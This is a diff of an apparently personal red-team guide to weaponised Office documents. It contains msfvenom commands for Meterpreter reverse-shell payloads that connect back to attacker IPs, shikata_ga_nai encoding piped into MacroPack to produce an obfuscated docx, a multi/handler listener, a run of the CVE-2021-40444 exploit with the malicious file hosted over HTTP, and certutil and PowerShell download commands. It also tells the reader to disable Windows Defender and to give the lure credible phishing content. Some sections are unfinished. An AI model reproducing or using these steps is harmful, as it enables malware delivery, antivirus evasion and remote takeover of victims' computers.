@@ -9,11 +9,53 @@ In this post the idea is develop a guide to:
 1. Generate a malicious binary with msfvenom to get a reverse shell on each kind of device
 2. Apply techniques to skip the AV protections or alerts
 
-## malicious file
+## AV evasion
+https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
+
+#### msfvenom
+With metasploit we can get malicious code to 
+	a) Skip AV protection
+	b) to execute from macros for examples
+
+----------------------------------
+We're goin to use msfvenom.bat to get easier method to test our payloads, for that download and install metasploit in your windows:
+https://www.metasploit.com/download and after install it you can execute `C:\metasploit-framework\bin\msfvenom.bat`
 
 
-### MacroPack
+And remember that maybe is better disable the protection that windows have folling the next manual https://ik4.es/desactivar-la-proteccion-contra-virus-y-amenazas-de-windows-10-en-el-control-de-defender/
+
+----------------------------------
+
+https://blog.didierstevens.com/2017/08/16/generating-powershell-scripts-with-msfvenom-on-windows/
+
+---------------------------------------
+Let's to create two malicious files, one for each kind of architecture
+```
+#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.123 LPORT=4444 -f vba -o /tmp/exe.vba
+
+#or create one process per kind of procesor and later append both to the word
+msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.10.123 -f raw -o x86.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=10.10.10.123 -f raw -o x64.bin
+```
+
+or from 25 técnicas for redTeam
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.54.132 LPORT=4444 -f vba -o /tmp/exe.vba
+```
+---------------------------------------
+
+The first step is create a executable that we can execute in out Windows machine.
+With the next command we're  cre
+```
+C:\metasploit-framework\bin\msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.54.132 LPORT=443 -e x64/shikata_ga_nai -i 5 -f vba | C:\Users\deby\Downloads\macro_pack\macro_pack.exe -o -G meterobf.docx
+```
+
+
+
+
+## MacroPack
 ------------------------------------------
+Macropack is a tool that allow introduce
 #### Install
 ######Linux
 https://github.com/sevagas/macro_pack
@@ -30,8 +72,11 @@ cd src
 
 python3 ./macro_pack.py -h
 ```
+
+**Alert! In Linux we can't generate documents because it needs of office installed!**
+
 ###### Windows
-Neccesary for nest a corrupt file in a office file. We could use python here but knowing that Microsoft is the worst for that kind of things (Work in general) just download the exe file compiled form github
+It's neccesary use Windows for nest a corrupt file in a office file. We could use python here but knowing that Microsoft is the worst for that kind of things (Work in general) just download the exe file compiled form github
 https://github.com/sevagas/macro_pack/releases/tag/v2.1.0
 
 For save the file in the system you need first disable the security in windows because it alerts you as a mimikatz executable. We are using a precompiled file, it's recomended just use a VM to use this kind of tools trust but not full trust.
@@ -96,7 +141,9 @@ We have to fix a pair of things at this point:
 
 2. We should fill with a credible content (In the same sense that que phising campain if we had it) to have more time to create a persistent conection with the compromised computer
 
+-----------------
 
+##### Getting a meterpreter
 To get a conection with this malicious file we just need to put a meterpreter session listening at the port necessary
 ```
 msf6 > use exploit/multi/handler
@@ -115,30 +162,59 @@ msf6 exploit(multi/handler) > exploit
 
 **Me queda probarlo con una máquina virtual**
 
+##### Getting a reverse shell with nc
+```
+
+```
+
+**Me queda probarlo con una máquina virtual**
+
 
 
 -----------
 
+
+
+
+
+
+
+
+
+
+----------------------------------------------
+## CVE's
 ### CVE-2021-40444
 https://github.com/lockedbyte/CVE-2021-40444
+In your kali Linux:
+```text
+#generate the document using calc.dll as pyload to execute
+python3 exploit.py generate test/calc.dll http://kaliLinux_IP
+
+#Expose the document through http and make the windows download it
+cd out
+python3 -m http.server 8000
 
 
-
-# AV evasion
-### msfvenom
-With metasploit we can get malicious code to 
-	a) Skip AV protection
-	b) to execute from macros for examples
-Let's to create two malicious files, one for each kind of architecture
-```
-#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.123 LPORT=4444 -f vba -o /tmp/exe.vba
-
-#or create one process per kind of procesor and later append both to the word
-msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.10.123 -f raw -o x86.bin
-msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=10.10.10.123 -f raw -o x64.bin
+# Now start the http server that will fake Microsoft office
+sudo python3 exploit.py host 80
 ```
 
-or from 25 técnicas for redTeam
+In your Windows VM:
+```text
+#Download the malicious document using the method you prefer
+1) certutil -> `certutil.exe -f -urlcache -split http://KaliIP:8000/document.docx document.docx`
+2) powershell
+	-> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://KaliIP:8000/document.docx','C:\Users\user\Desktop\document.docx')"
+
+->powershell Invoke-WebRequest "http://KaliIP:8000/document.docx" -OutFile "C:\Users\user\Desktop\file.exe"
+
+
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.54.132 LPORT=4444 -f vba -o /tmp/exe.vba
-```
+
+After that just open the document and enable the edition and...
+
+Windows defender detect and stop the malicious document alerting about CVE-2021-40444. Even disabling it  the execution is still stopped
+- You have to disable windows defender and real-time protection
+
+Why is being detected this file, is for the payload or because the attack vector?
